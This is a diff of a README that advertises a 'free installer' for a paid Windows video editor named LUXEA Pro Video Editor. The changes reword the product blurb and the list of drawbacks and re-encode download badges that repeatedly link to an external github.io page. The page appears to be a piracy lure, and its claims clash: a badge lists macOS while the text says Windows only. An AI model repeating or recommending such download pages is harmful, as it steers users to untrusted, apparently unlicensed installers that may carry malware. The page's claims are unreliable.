@@ -5,10 +5,10 @@
   <img src="https://img.shields.io/badge/Rating-4.9%2F5-F9A825?style=for-the-badge&logo=star" />
   <img src="https://img.shields.io/badge/Version-2026-101010?style=for-the-badge&logo=github" />
   <img src="https://img.shields.io/badge/Platform-Windows%20%7C%20macOS-informational?style=for-the-badge&logo=windows" />
-  <img src="https://img.shields.io/badge/Category-Video+Editor-E63946?style=for-the-badge&logo=appstore" />
+  <img src="https://img.shields.io/badge/Category-Video+Editing-E63946?style=for-the-badge&logo=appstore" />
 </p>
 
-**💻 LUXEA Pro Video Editor Free Installer** — LUXEA Pro Video Editor is a timeline-based video editing application designed for hobbyists and content creators. Works without internet access, no account required. Full offline installation.
+**💻 LUXEA Pro Video Editor Free Installer** — LUXEA Pro Video Editor is a Windows video editing application that provides timeline-based editing, effects, transitions, and color grading tools in an accessible package. Works without internet access, no account required. Full offline installation.
 
 <p align="center">
   <img src="https://skillicons.dev/icons?i=windows" />
@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install LUXEA Pro Video Editor](https://img.shields.io/badge/⬇_Install_LUXEA%20Pro%20Video%20Editor-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install LUXEA Pro Video Editor](https://img.shields.io/badge/⬇_Install_LUXEA+Pro+Video+Editor-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -30,16 +30,16 @@
 
 ## 📖 About LUXEA Pro Video Editor
 
-LUXEA Pro Video Editor is a timeline-based video editing application designed for hobbyists and content creators. It features multi-track editing, color grading, motion graphics templates, audio mixing, and direct export to social media platforms.
+LUXEA Pro Video Editor is a Windows video editing application that provides timeline-based editing, effects, transitions, and color grading tools in an accessible package. Targeting home users and content creators, LUXEA Pro offers the core video editing workflow without the complexity of professional NLEs. Export to YouTube, social media, and common video formats directly from the application.
 
 ---
 
 ## ❌ Problem: LUXEA Pro Video Editor is hard to access
 
-- **Limited Pro Tools** — Missing advanced features expected by professional video editors
-- **Windows Only** — No macOS version available
-- **Paid License** — Requires purchase with separate subscription for premium content packs
-- **Performance Issues** — Can struggle with 4K footage on lower-end hardware
+- **Windows Only** — No macOS version
+- **Commercial License** — Paid application
+- **Professional Limitations** — Not designed for broadcast or high-end production work
+- **Feature Depth** — Less capable than DaVinci Resolve or Premiere Pro for advanced editing
 
 ---
 
@@ -81,7 +81,7 @@ LUXEA Pro Video Editor is a timeline-based video editing application designed fo
 
 <div align="center">
 
-[![⬇ Install LUXEA Pro Video Editor](https://img.shields.io/badge/⬇_Install_LUXEA%20Pro%20Video%20Editor-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install LUXEA Pro Video Editor](https://img.shields.io/badge/⬇_Install_LUXEA+Pro+Video+Editor-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -121,11 +121,11 @@ LUXEA Pro Video Editor is a timeline-based video editing application designed fo
 
 ---
 
-**LUXEA Pro Video Editor Free Installer** — LUXEA Pro Video Editor is a timeline-based video editing application designed for hobbyists and content creators. Install without internet connection today!
+**LUXEA Pro Video Editor Free Installer** — LUXEA Pro Video Editor is a Windows video editing application that provides timeline-based editing, effects, transitions, and color grading tools in an accessible package. Install without internet connection today!
 
 <div align="center">
 
-[![⬇ Install LUXEA Pro Video Editor](https://img.shields.io/badge/⬇_Install_LUXEA%20Pro%20Video%20Editor-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install LUXEA Pro Video Editor](https://img.shields.io/badge/⬇_Install_LUXEA+Pro+Video+Editor-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
